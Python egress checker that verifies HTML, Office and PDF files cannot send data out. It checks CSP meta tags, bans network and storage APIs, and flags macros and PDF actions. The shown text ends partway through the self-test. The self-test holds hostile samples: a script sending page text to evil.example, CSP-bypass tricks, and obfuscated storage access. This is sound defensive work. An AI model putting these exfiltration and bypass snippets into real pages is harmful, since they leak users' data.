#!/usr/bin/env python3
"""Exit 0 if each file can send no data out (AIPM no-egress rule), else print each violation and exit 1.

What the browser enforces (the CSP) and what this script enforces are different things:
  * Fetch-type loads (scripts, styles, fonts, images, media, XHR/fetch, frames, forms, workers) are blocked by the
    CSP meta tag the page must carry. This script's job for those is to PROVE THE CSP IS IN FORCE: the document is
    strict UTF-8 with no control bytes, declares utf-8 only, has no duplicate attributes, no CDATA/PI/odd declarations,
    and the CSP meta is the second element in <head>, with the exact directives and the exact pinned URLs.
  * Navigation (location, window.open, programmatic clicks, meta refresh), WebRTC and browser storage have NO CSP
    control. For those this script scans script text for the APIs. That is guidance against mistakes, not a guarantee
    against a hostile author; SKILL.md says so.
docx/pptx/xlsx: no external non-hyperlink relationships, OLE, ActiveX, web extensions, data connections, macros, or
fetching field codes and formulas. pdf: no JavaScript, Launch, SubmitForm, ImportData, GoToR/E, XFA, rendition,
URL file specifications, or open/additional actions. Stdlib only, so it runs in claude.ai's sandbox.

Usage: check_egress.py [--exempt-account EMAIL] [--stdin NAME] FILE...
       check_egress.py --head [PINNED_URL...] [--google-fonts]   print the exact head block for those pinned assets
"""
import json, os, re, shutil, subprocess, sys, zipfile
import xml.etree.ElementTree as ET
from html.parser import HTMLParser
from pathlib import Path
from urllib.parse import urlsplit

# Must match SKILL.md and hooks/register.ts.
CDN_HOSTS = {"cdnjs.cloudflare.com", "cdn.jsdelivr.net", "unpkg.com"}
GFONTS_CSS, GFONTS_FILES = "fonts.googleapis.com", "fonts.gstatic.com"
VERSION = r"\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.]+)?"
# Pinned-version paths only: cdnjs /ajax/libs/<lib>/<ver>/<file>, jsDelivr /npm/<pkg>@<ver>/<file>, unpkg /<pkg>@<ver>/<file>.
PINNED_PATH = {
    "cdnjs.cloudflare.com": re.compile(rf"^/ajax/libs/[^/@]+/{VERSION}/[^?#]+$"),
    "cdn.jsdelivr.net": re.compile(rf"^/npm/(?:@[^/@]+/)?[^/@]+@{VERSION}/[^?#]+$"),
    "unpkg.com": re.compile(rf"^/(?:@[^/@]+/)?[^/@]+@{VERSION}/[^?#]+$"),
}
PLAIN_PATH = re.compile(r"^[A-Za-z0-9._~/@+-]+$")  # CSP compares paths literally; keep pinned URLs free of escapes
SRI = re.compile(r"^sha(256|384|512)-[A-Za-z0-9+/]+={0,2}$")
FIXED_CSP = {  # every directive except script-src/style-src is verbatim; those two are computed from the pinned tags
    "default-src": ["'none'"], "font-src": ["data:", f"https://{GFONTS_FILES}"], "img-src": ["data:", "blob:"],
    "media-src": ["data:", "blob:"], "connect-src": ["'none'"], "form-action": ["'none'"], "frame-src": ["'none'"],
    "object-src": ["'none'"], "base-uri": ["'none'"],
}
ASCII_WS = re.compile(r"[\t\n\f\r ]+")
DIRECTIVE = re.compile(r"^[A-Za-z0-9-]+$")
BANNED_JS = re.compile(
    # network and side channels the CSP does not fully cover
    r"\bfetch\s*\(|XMLHttpRequest|WebSocket|EventSource|sendBeacon|serviceWorker|RTCPeerConnection|RTCDataChannel|"
    r"\bimport\s*\(|importScripts|\bWorker\s*\(|SharedWorker|\bnavigator\s*[.\[]|"
    # navigation: no CSP directive governs it
    r"\b(?:window|document|self|top|parent|globalThis)\s*\.\s*location\b|(?<![.\w$\]])location\s*[.=\[]|"
    r"\bopen\s*\(|\.click\s*\(|dispatchEvent|\.submit\s*\(|requestSubmit|document\.write|http-equiv|<meta|"
    # storage
    r"localStorage|sessionStorage|indexedDB|document\.cookie|\bcaches\b|openDatabase|requestFileSystem|"
    # computed property access and code generation used to hide any of the above
    r"\b(?:window|self|globalThis|document|top|parent|frames)\s*\[|\beval\b|\bFunction\s*\(|fromCharCode|\bwith\s*\(|"
    r"\bReflect\b|['\"]\s*\+\s*['\"]"
)
CSS_URL = re.compile(r"(?:url|image-set|image)\(\s*['\"]?([^'\")]+)|@import\s+(?:url\()?['\"]?([^'\")\s;]+)", re.I)
VOID = {"area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "source", "track", "wbr"}
SVG_LEAF = {"circle", "ellipse", "line", "path", "polygon", "polyline", "rect", "use", "stop", "image", "animate",
            "animatemotion", "animatetransform", "set", "mpath", "view", "g", "text", "tspan", "textpath", "defs",
            "symbol", "marker", "pattern", "mask", "filter", "clippath", "lineargradient", "radialgradient", "switch"}
BANNED_TAGS = {"iframe", "frame", "frameset", "object", "embed", "applet", "base", "form", "noscript", "template",
               "plaintext", "xmp", "listing", "noembed", "noframes", "math", "foreignobject", "portal", "fencedframe"}
LINK_RELS_OK = {"stylesheet", "preconnect", "dns-prefetch", "icon"}
# Element attributes that make the browser fetch something. Only data:/blob: may appear in them (plus the pinned cases).
FETCH_ATTRS = {("script", "src"), ("link", "href"), ("img", "src"), ("img", "srcset"), ("source", "src"),
               ("source", "srcset"), ("video", "src"), ("video", "poster"), ("audio", "src"), ("track", "src"),
               ("input", "src"), ("input", "formaction"), ("button", "formaction"), ("body", "background"),
               ("use", "href"), ("use", "xlink:href"), ("image", "href"), ("image", "xlink:href"),
               ("feimage", "href"), ("feimage", "xlink:href"), ("a", "ping"), ("area", "ping")}
LINK_ATTRS = {("a", "href"), ("a", "xlink:href"), ("area", "href")}
CONTROL = re.compile(r"[\x00-\x08\x0b\x0e-\x1f\x7f]")
# Constructs browsers and html.parser (3.9 through 3.14) read differently; refuse them outright.
RAW_REFUSE = [(re.compile(r"</script(?![\t\n\f\r ]*>)", re.I), "malformed </script> end tag"),
              (re.compile(r"--!>"), "comment closed with --!>"), (re.compile(r"<!\["), "CDATA or marked section"),
              (re.compile(r"<\?"), "processing instruction")]


def scheme_host(url):
    """('https', host) for http(s) URLs; ('data', None) for data:/blob:; ('frag', None) for # only; ('relative', None)."""
    u = url.strip()
    if not u or u.startswith("#"):
        return "frag", None
    low = u.lower()
    if low.startswith(("data:", "blob:")):
        return "data", None
    if low.startswith(("mailto:", "tel:")):
        return "mailto", None
    if low.startswith("javascript:"):
        return "javascript", None
    if u.startswith("//"):
        u = "https:" + u
    p = urlsplit(u)
    if p.scheme.lower() in ("http", "https"):
        return p.scheme.lower(), (p.hostname or "").lower()
    return "relative", None


def srcset_urls(s):
    """Candidate URLs of a srcset the way the HTML spec splits them: a URL runs to whitespace (so a data: URI keeps
    its comma), then descriptors run to the next comma."""
    urls, i, n, ws = [], 0, len(s), " \t\n\f\r"
    while i < n:
        while i < n and s[i] in ws + ",":
            i += 1
        j = i
        while j < n and s[j] not in ws:
            j += 1
        if j > i:
            urls.append(s[i:j].rstrip(","))
        i = j
        while i < n:
            while i < n and s[i] in ws:
                i += 1
            k = i
            while k < n and s[k] not in ws + ",":
                k += 1
            i = k
            if i < n and s[i] == ",":
                i += 1
                break
    return urls


def pinned_source(url):
    """The CSP source for a pinned CDN URL, or an error string."""
    p = urlsplit(url)
    host = (p.hostname or "").lower()
    if p.scheme.lower() != "https" or host not in CDN_HOSTS:
        return None, f"{url} is not https on an allowed provider (cdnjs, jsDelivr npm, unpkg)"
    if p.query or p.fragment or not PINNED_PATH[host].match(p.path) or not PLAIN_PATH.match(p.path):
        return None, f"{url} is not a pinned-version path (no @latest, no GitHub mirrors, no query string)"
    return f"https://{host}{p.path}", None


class Scan(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.bad, self.csp, self.referrer, self.in_script, self.in_style = [], None, 0, False, False
        self.stack, self.head_seq, self.scripts, self.styles, self.gfonts, self.csp_count = [], [], set(), set(), set(), 0

    def fail(self, msg):
        self.bad.append(f"line {self.getpos()[0]}: {msg}")

    def handle_starttag(self, tag, attrs):
        names = [k.lower() for k, _ in attrs]
        if len(set(names)) != len(names):
            self.fail(f"<{tag}> repeats an attribute (browsers keep the first, scanners differ)")
        a = {}
        for k, v in attrs:
            a.setdefault(k.lower(), v or "")  # first occurrence wins, as in the browser
        if self.stack[-1:] == ["head"] and self.csp is None:
            self.head_seq.append((tag, a))
        if tag in BANNED_TAGS:
            self.fail(f"<{tag}> is not allowed")
        if tag == "script" and ({"svg", "math"} & set(self.stack)):
            self.fail("<script> inside <svg>/<math> (character references decode differently there)")
        if tag == "script" and a.get("type", "").strip().lower() == "module":
            self.fail("<script type=module> (static imports bypass SRI); use a UMD/IIFE build")
        if tag == "meta":
            self.meta(a)
        for k, v in a.items():
            if k.startswith("on") and BANNED_JS.search(v):
                self.fail(f"inline {k} handler uses {BANNED_JS.search(v).group(0).strip()!r}")
            if k == "style":
                self.check_css(v)
            if k in ("href", "src", "action", "formaction", "data", "xlink:href") and scheme_host(v)[0] == "javascript":
                self.fail(f"javascript: URL in {k}")
        for (t, attr) in LINK_ATTRS:
            if tag == t and attr in a and scheme_host(a[attr])[0] in ("http", "https"):
                if not {"noopener", "noreferrer"} <= set(a.get("rel", "").lower().split()):
                    self.fail(f'<{tag} {attr}="{a[attr]}"> needs rel="noopener noreferrer"')
        for (t, attr) in FETCH_ATTRS:
            if tag == t and attr in a:
                for url in (srcset_urls(a[attr]) if attr == "srcset" else [a[attr]]):
                    self.fetch(tag, attr, url, a)
        if tag not in VOID:
            self.stack.append(tag)
        if tag == "script":
            self.in_script = True
        if tag == "style":
            self.in_style = True

    def meta(self, a):
        he = a.get("http-equiv", "").strip().lower()
        if "charset" in a and a["charset"].strip().lower() != "utf-8":
            self.fail(f"charset {a['charset']!r}; only utf-8 is allowed (legacy encodings re-tokenise the markup)")
        if he == "content-type":
            if "charset=utf-8" not in a.get("content", "").replace(" ", "").lower():
                self.fail("content-type meta without charset=utf-8")
        elif he == "content-security-policy":
            self.csp_count += 1
            if self.csp_count > 1:
                self.fail("more than one Content-Security-Policy meta tag")
            self.csp = a.get("content", "")
        elif he:
            self.fail(f'http-equiv="{he}" is not allowed (meta refresh and friends navigate)')
        if a.get("name", "").strip().lower() == "referrer":
            self.referrer += 1
            if a.get("content", "").strip().lower() != "no-referrer":
                self.fail('referrer meta must be content="no-referrer"')

    def fetch(self, tag, attr, url, a):
        kind, host = scheme_host(url)
        if kind in ("data", "frag"):
            return
        if kind == "relative" or kind == "mailto":
            self.fail(f'<{tag} {attr}="{url}"> is a relative file reference; the document must be self-contained')
            return
        if kind == "http":
            self.fail(f"<{tag} {attr}> uses http://; only https:// pinned providers are allowed")
            return
        rel = set(a.get("rel", "").lower().split())
        if tag == "script" or (tag == "link" and "stylesheet" in rel):
            if tag == "link" and host == GFONTS_CSS:
                path = urlsplit(url).path
                if path not in ("/css", "/css2"):
                    self.fail(f"Google Fonts stylesheet must be /css or /css2, not {path}")
                self.gfonts.add(f"https://{GFONTS_CSS}{path}")
                return
            src, err = pinned_source(url)
            if err:
                self.fail(f"<{tag}> {err}")
                return
            if not SRI.match(a.get("integrity", "")) or a.get("crossorigin", "").strip().lower() not in ("", "anonymous") or "crossorigin" not in a:
                self.fail(f'<{tag}> {url} needs integrity="sha384-…" and crossorigin="anonymous"')
            (self.scripts if tag == "script" else self.styles).add(src)
        elif tag == "link" and {"preconnect", "dns-prefetch"} & rel:
            if host not in CDN_HOSTS | {GFONTS_CSS, GFONTS_FILES}:
                self.fail(f"<link rel=preconnect> to {host}, not an allowed provider")
        elif tag == "link":
            self.fail(f"<link rel=\"{a.get('rel', '')}\"> to {host}; only stylesheet/preconnect to allowed providers, or data: icons")
        else:
            self.fail(f"<{tag} {attr}> points at {host}; images and media must be inline data: URIs")

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)
        if tag in SVG_LEAF or tag.startswith("fe"):
            self.handle_endtag(tag)
        elif tag not in VOID:
            self.fail(f"<{tag}/> self-closing syntax on a non-void element; the browser leaves it open")

    def handle_endtag(self, tag):
        if tag == "script":
            self.in_script = False
        if tag == "style":
            self.in_style = False
        if tag in self.stack:
            del self.stack[len(self.stack) - 1 - self.stack[::-1].index(tag):]

    def handle_data(self, data):
        if self.in_script and (m := BANNED_JS.search(data)):
            self.fail(f"script uses {m.group(0).strip()!r} (network, navigation, storage or obfuscation)")
        if self.in_style:
            self.check_css(data)

    def handle_comment(self, data):
        if "--" in data:
            self.fail("comment contains --")

    def handle_decl(self, decl):
        if decl.strip().lower() != "doctype html":
            self.fail(f"declaration <!{decl[:30]}> is not allowed")

    def unknown_decl(self, data):
        self.fail(f"marked section <![{data[:20]}…> is not allowed")

    def handle_pi(self, data):
        self.fail("processing instruction is not allowed")

    def check_css(self, css):
        for m in CSS_URL.finditer(css):
            kind, host = scheme_host(m.group(1) or m.group(2) or "")
            if kind == "relative":
                self.fail("CSS references a relative file; the document must be self-contained")
            elif kind in ("http", "https") and not (kind == "https" and host == GFONTS_FILES):
                self.fail(f"CSS loads from {host}; only inline data: (or fonts.gstatic.com font files) are allowed")


def csp_directives(csp):
    """Parse like a browser: ';' separates directives, ASCII whitespace separates tokens, first directive wins."""
    bad, d = [], {}
    if not all(0x20 <= ord(c) < 0x7F or c in "\t\n\f\r" for c in csp):
        return ["CSP contains non-ASCII or control characters"], d
    for part in csp.split(";"):
        toks = ASCII_WS.split(part.strip("\t\n\f\r "))
        if toks == [""]:
            continue
        name = toks[0].lower()
        if not DIRECTIVE.match(name):
            bad.append(f"CSP directive name {name!r} is malformed"); continue
        if name in d:
            bad.append(f"CSP repeats {name}")
        d.setdefault(name, [re.sub(r"^https://", "https://", t, flags=re.I) for t in toks[1:]])
    return bad, d


def expected_csp(scripts, styles, gfonts):
    d = dict(FIXED_CSP)
    d["script-src"] = ["'unsafe-inline'"] + sorted(scripts)
    d["style-src"] = ["'unsafe-inline'"] + sorted(gfonts) + sorted(styles)
    return d


def csp_text(scripts=(), styles=(), gfonts=()):
    d = expected_csp(set(scripts), set(styles), set(gfonts))
    order = ["default-src", "script-src", "style-src", "font-src", "img-src", "media-src", "connect-src", "form-action",
             "frame-src", "object-src", "base-uri"]
    return "; ".join(f"{k} {' '.join(d[k])}" for k in order)


def head_block(scripts=(), styles=(), gfonts=()):
    return ('<meta charset="utf-8">\n<meta http-equiv="Content-Security-Policy" content="'
            + csp_text(scripts, styles, gfonts) + '">\n<meta name="referrer" content="no-referrer">')


def check_csp(csp, scripts, styles, gfonts):
    if csp is None:
        return ['no <meta http-equiv="Content-Security-Policy"> tag']
    bad, d = csp_directives(csp)
    if bad:
        return bad
    want = expected_csp(scripts, styles, gfonts)
    for k, v in want.items():
        got = d.get(k)
        if got is None:
            bad.append(f"CSP lacks {k}")
        elif sorted(got) != sorted(v):
            bad.append(f"CSP {k} must be exactly: {' '.join(v)} (got: {' '.join(got) or 'nothing'})")
    for k in d:
        if k not in want:
            bad.append(f"CSP has an extra directive {k}")
    return bad


def check_html(text):
    bad = []
    if CONTROL.search(text):
        return ["control characters in the document (legacy-encoding escapes re-tokenise the markup)"]
    for rx, why in RAW_REFUSE:
        if rx.search(text):
            bad.append(why)
    s = Scan()
    s.feed(text)
    s.close()
    bad += s.bad
    seq = [(t, a) for t, a in s.head_seq]
    ok_head = (len(seq) >= 2 and seq[0][0] == "meta" and set(seq[0][1]) == {"charset"} and seq[0][1]["charset"].strip().lower() == "utf-8"
               and seq[1][0] == "meta" and seq[1][1].get("http-equiv", "").strip().lower() == "content-security-policy")
    if s.csp is not None and not ok_head:
        bad.append('<head> must start with <meta charset="utf-8"> followed by the Content-Security-Policy meta')
    elif s.csp is None and not any("Content-Security-Policy" in b for b in bad):
        bad.append('no <meta http-equiv="Content-Security-Policy"> tag inside <head>')
    bad += check_csp(s.csp, s.scripts, s.styles, s.gfonts) if s.csp is not None else []
    if s.referrer != 1:
        bad.append('exactly one <meta name="referrer" content="no-referrer"> is required')
    return bad


# ---------------------------------------------------------------- OOXML
HYPERLINK_REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"
BAD_REL_TYPES = re.compile(r"/(vbaProject|oleObject|activeXControl|webextension|externalLink|frame|attachedTemplate|subDocument|"
                           r"mailMergeSource|queryTable|connections|control|dde)\b", re.I)
BAD_PARTS = re.compile(r"(^|/)(vbaproject|vbadata|activex|webextensions|embeddings|connections\.xml|querytables|externallinks)(/|\.|$)")
BAD_CONTENT_TYPES = re.compile(r"vbaProject|ms-office\.activeX|oleObject|macroEnabled", re.I)
FIELD = re.compile(r"INCLUDEPICTURE|INCLUDETEXT|\bIMPORT\b|\bLINK\b|\bDDE(AUTO)?\b|\bRD\b", re.I)
FORMULA = re.compile(r"WEBSERVICE\s*\(|_xlfn\.IMAGE\s*\(|\bRTD\s*\(|FILTERXML\s*\(", re.I)
MACRO_EXT = {".docm", ".dotm", ".xlsm", ".xltm", ".xlam", ".pptm", ".potm", ".ppsm", ".ppam"}
OOXML_EXT = {".docx", ".dotx", ".xlsx", ".xltx", ".pptx", ".potx", ".ppsx"}


def xml_text(data: bytes) -> str:
    if data[:2] in (b"\xff\xfe", b"\xfe\xff"):
        return data.decode("utf-16", "ignore")
    return data.decode("utf-8", "ignore")


def local(tag):
    return tag.rsplit("}", 1)[-1]


def parse_part(n, data):
    if re.search(r"<!(DOCTYPE|ENTITY)", xml_text(data), re.I):
        return None, [f"{n}: declares a DTD or entities"]
    try:
        return ET.fromstring(data), []
    except ET.ParseError as e:
        return None, [f"{n}: unparseable XML ({e})"]


def check_rels(n, data):
    root, bad = parse_part(n, data)
    if root is None:
        return bad
    for rel in root.iter():
        if local(rel.tag) != "Relationship":
            continue
        typ, mode = rel.get("Type", ""), rel.get("TargetMode", "")
        if BAD_REL_TYPES.search(typ):
            bad.append(f"{n}: relationship {typ.rsplit('/', 1)[-1]} -> {rel.get('Target', '?')}")
        elif mode.strip().lower() == "external" and typ != HYPERLINK_REL:
            bad.append(f"{n}: external {typ.rsplit('/', 1)[-1]} -> {rel.get('Target', '?')}")
    return bad


def check_word_part(n, data):
    root, bad = parse_part(n, data)
    if root is None:
        return bad
    for el in root.iter():
        name = local(el.tag)
        if name in ("altChunk", "objectEmbed", "objectLink", "control", "subDoc", "dataSource"):
            bad.append(f"{n}: <w:{name}> embeds or links external content")
    for p in root.iter():
        if local(p.tag) != "p":
            continue
        instr = "".join((e.text or "") for e in p.iter() if local(e.tag) == "instrText")
        instr += " ".join(e.get(k) for e in p.iter() if local(e.tag) == "fldSimple" for k in e.keys() if local(k) == "instr")
        if FIELD.search(instr):
            bad.append(f"{n}: field code {instr.strip()[:60]!r}")
    return bad


def check_sheet(n, data):
    root, bad = parse_part(n, data)
    if root is None:
        return bad
    for f in root.iter():
        if local(f.tag) == "f" and FORMULA.search(f.text or ""):
            bad.append(f"{n}: formula {(f.text or '').strip()[:60]!r} reaches the network")
    return bad


def check_ooxml(p: Path):
    bad = []
    with zipfile.ZipFile(p) as z:
        for n in z.namelist():
            low = n.lower()
            if BAD_PARTS.search(low):
                bad.append(f"{n}: macro, ActiveX, OLE, web-extension or external-data part")
            elif low == "[content_types].xml" and BAD_CONTENT_TYPES.search(xml_text(z.read(n))):
                bad.append(f"{n}: declares a macro, ActiveX or OLE content type")
            elif low.endswith(".rels"):
                bad += check_rels(n, z.read(n))
            elif low.startswith("word/") and low.endswith(".xml"):
                bad += check_word_part(n, z.read(n))
            elif low.startswith("xl/worksheets/") and low.endswith(".xml"):
                bad += check_sheet(n, z.read(n))
    return bad


# ---------------------------------------------------------------- PDF
PDF_ACTION = re.compile(rb"/(JavaScript|JS|Launch|SubmitForm|ImportData|GoToR|GoToE|RichMedia|Rendition|Movie|Sound|XFA|GoTo3DView|AA)\b")
PDF_URLFS = re.compile(rb"/FS\s*/URL\b")
PDF_OPEN = re.compile(rb"/OpenAction\s*(?![\s\[])")  # anything but an array destination such as [3 0 R /Fit]


def pdf_names_decoded(raw: bytes) -> bytes:
    """PDF names may hex-escape characters (/J#61vaScript); normalise so the pattern can't be dodged."""
    return re.sub(rb"#([0-9A-Fa-f]{2})", lambda m: bytes([int(m.group(1), 16)]), raw)


STREAM_BODY = re.compile(rb"stream\r?\n.*?endstream", re.S)


def pdf_scan(raw: bytes):
    """Violations in the plain-text object dictionaries of `raw` (stream bodies removed so binary data cannot match)."""
    text = pdf_names_decoded(STREAM_BODY.sub(b"stream endstream", raw))
    bad = {f"PDF action /{m.group(1).decode()}" for m in PDF_ACTION.finditer(text)}
    if PDF_URLFS.search(text):
        bad.add("PDF file specification with /FS /URL (external stream or media)")
    if PDF_OPEN.search(text):
        bad.add("PDF /OpenAction that is not a plain page destination")
    return bad


def check_pdf(p: Path):
    raw = p.read_bytes()
    bad = pdf_scan(raw)  # the file as written: qpdf drops constructs it does not support (external streams), so scan both
    if shutil.which("qpdf"):
        r = subprocess.run(["qpdf", "--qdf", "--object-streams=disable", "--decrypt", str(p), "-"], capture_output=True)
        if r.returncode not in (0, 3):  # 3 = succeeded with warnings
            return [f"qpdf could not expand the PDF (exit {r.returncode}); cannot verify it"]
        bad |= pdf_scan(r.stdout)  # object streams and encrypted objects expanded
    elif b"/ObjStm" in pdf_names_decoded(raw) or b"/Encrypt" in pdf_names_decoded(raw):
        return ["PDF uses object streams or encryption and qpdf is not installed; cannot verify it"]
    return sorted(bad)


# ---------------------------------------------------------------- driver
def read_html(p: Path):
    data = p.read_bytes()
    if data.startswith(b"\xef\xbb\xbf"):
        data = data[3:]
    try:
        return data.decode("utf-8"), None
    except UnicodeDecodeError as e:
        return None, f"not valid UTF-8 at byte {e.start} (the browser and this check would read different markup)"


def check(p: Path, text=None):
    ext = p.suffix.lower()
    if ext in {".html", ".htm"}:
        if text is None:
            text, err = read_html(p)
            if err:
                return [err]
        return check_html(text)
    if ext in {".svg", ".xhtml", ".xht", ".mhtml", ".mht"}:
        return [f"{ext} cannot carry the CSP meta tag; deliver an .html page (inline SVG is fine inside it)"]
    if ext in MACRO_EXT:
        return [f"{ext} is a macro-enabled format; save as {ext[:-1]}x"]
    if ext == ".xlsb":
        return [".xlsb binary workbooks cannot be checked; save as .xlsx"]
    if ext in OOXML_EXT:
        return check_ooxml(p)
    if ext == ".pdf":
        return check_pdf(p)
    return []


def exempt(email: str) -> bool:
    cfg = os.environ.get("CLAUDE_CONFIG_DIR")
    path = Path(cfg) / ".claude.json" if cfg else Path("~/.claude.json").expanduser()
    try:
        acct = json.loads(path.read_text())
        return acct.get("oauthAccount", {}).get("emailAddress", "").lower() == email.lower()
    except Exception:
        return False


def main(argv):
    args, stdin_name, email = [], None, None
    i = 0
    while i < len(argv):
        if argv[i] == "--exempt-account":
            email, i = argv[i + 1], i + 2
        elif argv[i] == "--stdin":
            stdin_name, i = argv[i + 1], i + 2
        else:
            args.append(argv[i]); i += 1
    if email and exempt(email):
        print(f"exempt: {email}")
        return 0
    rc = 0
    if stdin_name:
        for b in check(Path(stdin_name), sys.stdin.read()):
            print(f"EGRESS: {stdin_name}: {b}"); rc = 1
    for a in args:
        p = Path(a)
        bad = check(p) if p.is_file() else ["file not found"]
        for b in bad:
            print(f"EGRESS: {a}: {b}"); rc = 1
    return rc


def head_cli(argv):
    gf = "--google-fonts" in argv
    urls = [u for u in argv if u != "--google-fonts"]
    scripts = {pinned_source(u)[0] for u in urls if not u.lower().endswith(".css")}
    styles = {pinned_source(u)[0] for u in urls if u.lower().endswith(".css")}
    if None in scripts | styles:
        print("every URL must be a pinned-version path on cdnjs, jsDelivr npm or unpkg"); return 2
    print(head_block(scripts, styles, {f"https://{GFONTS_CSS}/css2"} if gf else set()))
    return 0


# ---------------------------------------------------------------- selftest
XLSX = "https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"
EVIL = "https://evil.example"
PNG = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="


def doc(body="", head_extra="", scripts=(), styles=(), gfonts=(), csp=None, charset='<meta charset="utf-8">', pre=""):
    csp = csp if csp is not None else f'<meta http-equiv="Content-Security-Policy" content="{csp_text(scripts, styles, gfonts)}">'
    return (f'<!DOCTYPE html><html lang="en"><head>{pre}{charset}{csp}<meta name="referrer" content="no-referrer">'
            f'<title>t</title>{head_extra}</head><body><!-- AIPM-CONFIDENTIAL-INTERNAL --><p>secret</p>{body}</body></html>')


def selftest():
    sri = 'integrity="sha384-vtjasyidUo0kW94K5MXDXntzOJpQgBKXmE7e2Ga4LG0skTTLeBi97eFAXsqewJjw" crossorigin="anonymous"'
    gf = '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap">'
    good = [
        doc(f'<img src="{PNG}"><a href="https://clypboard.com" rel="noopener noreferrer">x</a>'
            '<a id="dl" download="x.csv">Download</a><script>const b=new Blob(["a,b"],{type:"text/csv"});'
            'document.getElementById("dl").href=URL.createObjectURL(b);</script>'),
        doc(head_extra=f'{gf}<script src="{XLSX}" {sri}></script>', scripts=[XLSX], gfonts=[f"https://{GFONTS_CSS}/css2"]),
        doc('<svg viewBox="0 0 1 1"><circle r="1"/><path d="M0 0"/><text x="1" y="1"/><g/></svg>'),
        doc(pre="", charset='<meta charset="UTF-8"/>'),
        doc('<textarea>notes</textarea><div onclick="this.textContent=1">x</div>'),
        doc(f'<img srcset="{PNG} 1x, {PNG} 2x"><script>const r={{location:"HQ"}};const n=r.location.name;const t="Location: "+n</script>'),
        doc("<script>const s='Total: '+n+' units'</script>"),
        doc('<p style="color:red;background:url(data:image/png;base64,AA==)">x</p><style>@font-face{font-family:x;src:url(https://fonts.gstatic.com/s/a.woff2)}</style>'),
        "﻿" + doc(),  # BOM is stripped by read_html; check_html itself must also tolerate the plain doc
    ]
    for g in good:
        assert check_html(g.lstrip("﻿")) == [], check_html(g.lstrip("﻿"))
    assert check_html(doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text().replace("https://", "HTTPS://")}">')) == []
    bad = {  # (document, substring expected in a violation)
        # the three Critical CSP-disabling tricks
        doc(csp=f'<meta http-equiv="Content-Security-Policy" content="default-src *" content="{csp_text()}">'): "repeats an attribute",
        doc(f'<img src="{EVIL}/a.png" src="{PNG}">'): "repeats an attribute",
        doc(csp=f'<meta http-equiv="Content-Security-Policy" x="\x1b$B" content="{csp_text()}" y="\x1b(B">', charset='<meta charset="iso-2022-jp">'): "control characters",
        doc(charset='<meta charset="shift_jis">'): "only utf-8",
        doc(charset='<meta http-equiv="content-type" content="text/html; charset=windows-1252">'): "charset=utf-8",
        # navigation and side channels
        doc(f"<script>location.href='{EVIL}/?d='+document.body.innerText</script>"): "location",
        doc(f"<script>window.open('{EVIL}')</script>"): "open(",
        doc(f'<a id=x href="{EVIL}" rel="noopener noreferrer">x</a><script>document.getElementById("x").click()</script>'): "click(",
        doc(head_extra=f'<meta http-equiv="refresh" content="0; {EVIL}">'): "http-equiv",
        doc("<script>const pc=new RTCPeerConnection({iceServers:[{urls:'stun:x'}]})</script>"): "RTCPeerConnection",
        doc("<script>document.body.innerHTML='<meta http-equiv=refresh content=0;x>'</script>"): "<meta",
        doc(f'<a href="#" ping="{EVIL}/p">x</a>'): "ping",
        # storage and obfuscation
        doc("<script>window['local'+'Storage'].setItem('k','v')</script>"): "window",
        doc("<script>self['indexed'+'DB'].open('x')</script>"): "self",
        doc("<svg><script>&#108;ocalStorage.setItem('k','v')</script></svg>"): "inside <svg>",
        doc("<![CDATA[><script>localStorage.setItem('k3','v3')</script>]]>"): "CDATA",
        doc("<!-- a --!><script>localStorage.setItem('k4','v4')</script> -->"): "--!>",
        doc(f"<script>var a=1</script x><img src='{EVIL}/h.png'><script>1</script>"): "malformed </script>",
        doc("<script>eval('1')</script>"): "eval",
        doc("<script>const k='fe'+'tch'</script>"): "'+'",
        doc("<script>navigator.clipboard.writeText(1)</script>"): "navigator",
        # fetch-type references the checker must still name
        doc(f'<img srcset="{PNG} 1x, {EVIL}/2x.png 2x">'): "inline data",
        doc(f'<img srcset="{PNG} 1x,{EVIL}/2x.png 2x">'): "inline data",
        doc("<script>const x=row.location.name; const site={location:'HQ'}; window.location.href='x'</script>"): "location",
        doc("<script>location='https://x'</script>"): "location",
        doc(f'<div style="background-image:image-set(\'{EVIL}/i.png\' 1x)"></div>'): "CSS loads",
        doc().replace("<body>", f'<body background="{EVIL}/bg.png">'): "inline data",
        doc(f'<svg><image xlink:href="{EVIL}/x.png"/></svg>'): "inline data",
        doc(f'<input type="image" src="{EVIL}/i.png">'): "inline data",
        doc(f'<button formaction="{EVIL}/f">go</button>'): "inline data",
        doc('<iframe srcdoc="<p>hi</p>"></iframe>'): "<iframe> is not allowed",
        doc('<object></object>'): "<object> is not allowed",
        doc('<form></form>'): "<form> is not allowed",
        doc('<noscript><p>x</p></noscript>'): "<noscript> is not allowed",
        doc("<a href=\"javascript:localStorage.setItem('k','v')\">x</a>"): "javascript: URL",
        doc(f'<map name=m><area href="{EVIL}/a" shape=rect coords="0,0,9,9"></map>'): 'rel="noopener noreferrer"',
        doc(f'<a href="{EVIL}">x</a>'): 'rel="noopener noreferrer"',
        doc(head_extra='<script src="https://fonts.googleapis.com/x.js"></script>'): "not https on an allowed provider",
        doc(head_extra='<script src="https://cdn.jsdelivr.net/gh/someone/repo@main/x.js" integrity="sha384-AAAA" crossorigin="use-credentials"></script>'): "pinned-version path",
        doc(head_extra='<script src="https://unpkg.com/lodash@latest/lodash.min.js" integrity="sha384-AAAA" crossorigin></script>'): "pinned-version path",
        doc(head_extra=f'<script src="{XLSX}" {sri}></script>'): "script-src must be exactly",  # CSP not updated for the pin
        doc(head_extra=f'<script src="{XLSX}" integrity="sha384-AAAA" crossorigin="use-credentials"></script>', scripts=[XLSX]): 'crossorigin="anonymous"',
        doc(head_extra=f'<script src="{XLSX}"></script>', scripts=[XLSX]): "integrity",
        doc(head_extra='<script src="http://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js" integrity="sha384-AAAA" crossorigin></script>'): "http://",
